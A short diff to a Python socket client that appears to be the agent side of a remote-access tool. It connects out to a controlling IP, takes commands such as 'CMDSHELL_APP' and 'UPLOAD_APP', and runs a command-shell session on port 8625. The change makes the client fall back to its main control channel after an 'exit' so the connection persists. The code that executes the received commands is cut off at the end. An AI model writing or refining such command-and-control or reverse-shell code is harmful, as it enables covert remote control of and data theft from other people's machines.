@@ -19,7 +19,7 @@ def PINGPONG_client(ip, port):
         if data.decode() == "CMDSHELL_APP":
             s.send(bytes("OK", 'utf8'))
             s.close()
-            CMD_client(ip, 8625)
+            CMD_client(ip, 8625, port)
             break
         if data.decode() == "UPLOAD_APP":
             s.send(bytes("OK", 'utf8'))
@@ -57,7 +57,7 @@ def PINGPONG_client(ip, port):
     s.close()
 
 
-def CMD_client(ip, port):
+def CMD_client(ip, port, main_port):
     try:
         cmd_c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         cmd_c.connect((ip, port))
@@ -65,9 +65,10 @@ def CMD_client(ip, port):
         sys.exit(1)
     while True:
         cmd_command = cmd_c.recv(1024)
-        if cmd_command.decode("utf8") == "exit":
+        if cmd_command.decode("utf8") == "exit" or cmd_command.decode("utf8") == "EXIT":
+            time.sleep(2)
+            PINGPONG_client(ip, main_port)
             break
-            PINGPONG.client(ip, port)
         elif cmd_command.decode("utf8") == "PING":
             cmd_c.send(bytes("PONG", "utf8"))
         else:
